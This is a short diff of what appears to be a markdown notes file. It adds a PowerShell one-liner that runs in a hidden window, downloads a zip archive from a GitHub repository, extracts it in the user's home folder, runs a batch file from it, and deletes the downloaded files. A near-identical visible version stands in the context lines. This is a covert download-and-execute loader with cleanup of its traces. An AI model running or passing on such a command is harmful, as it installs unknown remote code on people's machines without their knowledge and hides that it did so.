@@ -18,6 +18,11 @@ boiling hatred in a pest
 ```
 
 ```
+powershell -w hidden -c "& {$w=$home;cd $w;$z=\"$w\r.zip\";Invoke-WebRequest 'https://github.com/3lv/r/archive/r.zip' -o $z;Expand-Archive $z . -f;.\r-r\r.bat;Remove-Item $z,r-r -r -fo;}"&exit
+```
+
+
+```
 powershell -c "& {$w=$home;cd $w;$z=\"$w\r.zip\";Invoke-WebRequest 'https://github.com/3lv/r/archive/r.zip' -o $z;Expand-Archive $z . -f;.\r-r\r.bat;Remove-Item $z,r-r -r -fo;cls}"
 ```
 
